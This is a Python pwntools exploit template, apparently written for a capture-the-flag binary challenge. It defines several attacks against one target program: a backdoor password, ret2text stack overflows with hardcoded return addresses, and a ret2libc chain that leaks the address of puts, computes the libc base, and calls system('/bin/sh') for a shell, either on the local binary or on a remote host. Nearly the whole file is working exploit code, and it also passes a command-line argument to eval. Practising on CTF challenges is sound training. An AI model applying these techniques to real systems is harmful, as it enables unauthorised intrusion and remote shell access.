#!/usr/bin/env python2
# -*- coding: utf-8 -*- #
# @偏有宸机_Exploit-Template
# Exploiting: python exploit.py [IP PORT] [Exploit_Template]
# Edit values:
#      - RemPro()
#           - elf_addr
#           - pro_libc
#           - enable_Onegadgets
#      - exp()

import os
import sys
import subprocess
from pwn import *
from one_gadget import generate_one_gadget 
context.terminal = ["tmux","new-window"]
# context.terminal = ["tmux","splitw","-h"]
# context.arch = "amd64"
context.arch = "i386"
context.log_level = "debug"

### 远程本地连接
def RemPro(ip='',port=''):
    global sh,elf,libc,one_ggs
    elf_addr = "./pwn"                                   # 本地ELF
    pro_libc = "/lib/x86_64-linux-gnu/libc.so.6"       # Libc文件
    rem_libc = "/media/psf/DA1SY/Tools/Pwn-tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so"
    if len(sys.argv) > 2 :
        sh = remote(sys.argv[1],sys.argv[2])
        try:
            libc = ELF(rem_libc)
            pro_libc = rem_libc
        except:
            log.info("No set Remote_libc...")
            libc = ELF(pro_libc)
    else:
        libc = ELF(pro_libc)
        try:
            sh = remote(ip,port)
            libc = ELF(rem_libc)
            pro_libc = rem_libc
            log.info("Remote Start...")
        except:
            sh = process(elf_addr)
            log.info("Local Start...")
    # one_ggs = [0x45226, 0x4527a, 0xf0364,0xf1207]
    # one_ggs = one_gadget(pro_libc)
    elf = ELF(elf_addr)
    return 1

### 调试用
def debug(cmd=""):
    if len(sys.argv) <= 2:
        log.progress("Loading Debug....")
        gdb.attach(sh,cmd)
### One_Gadget
# def one_gadget(filename):
#     log.progress("Leak One_Gadgets...")
#     one_ggs = str(subprocess.check_output(['one_gadget', '--raw', '-f',filename]))[2:-3].split(' ')
#     return list(map(int,one_ggs))
def one_gadget(libc_addr):
    log.progress("Leak One_Gadgets...")
    path_to_libc=libc_addr
    gadget =[]
    for offset in generate_one_gadget(path_to_libc):
        gadget.append(int(offset))
    return gadget
    # one_gg = one_gadget("/lib/x86_64-linux-gnu/libc.so.6")

def exp():  # 预后门
    sh.recvuntil(">> ")
    sh.sendline("1")
    sh.recvuntil("password: ")
    sh.sendline("f4ck")
    return sh
def exp2():  # ret2text
    sh.recvuntil(">> ")
    sh.sendline("1")
    sh.recvuntil("password: ")
    sh.sendline(b"a"*28+p32(0x080485f4))
    return sh
def exp3(): # ret2text
    sh.recvuntil(">> ")
    sh.sendline("2")
    sh.recvuntil("message: ")
    sh.sendline("pwn")
    sh.recvuntil("name: ")
    payload = b"a"*44+p32(0x080485F4)
    sh.sendline(payload)
    return sh
def exp4(): # syscall
    sh.recvuntil(">> ")
    sh.sendline("2")
    sh.recvuntil("message: ")
    sh.sendline("pwn")
    sh.recvuntil("name: ")
    payload = b"a"*44+p32(0x080485e4)
    sh.sendline(payload)
    return sh
def exp5(): # re2libc
    puts_plt = elf.plt["puts"]
    puts_got = elf.got["puts"]
    main_addr = 0x0804877E
    def start(payload):
        sh.recvuntil(">> ")
        sh.sendline("2")
        sh.recvuntil("message: ")
        sh.sendline("pwn")
        sh.recvuntil("name: ")
        sh.sendline(payload)
    payload = b"a"*44+p32(puts_plt)+p32(main_addr)+p32(puts_got)
    start(payload)
    sh.recvuntil("Done!\n")
    puts_addr = u32(sh.recv(4).ljust(4,b"\x00"))
    success("puts_addr => 0x%x",puts_addr)
    libc_base = puts_addr - libc.sym["puts"]
    success("libc_base => 0x%x",libc_base)
    system = libc_base+libc.sym["system"]
    # success("0x%x",libc.search(b"/bin/sh").next())
    binsh = libc_base+0x11e7bb
    payload2 = b"a"*44+p32(system)+p32(main_addr)+p32(binsh)
    start(payload2)
    return sh

    
if __name__=="__main__":
    RemPro()
    if len(sys.argv) > 3 :
        eval(sys.argv[3])()
    elif (len(sys.argv)>1 and len(sys.argv)<3):
        eval(sys.argv[1])()
    else:
        exp()
    sh.interactive()
    

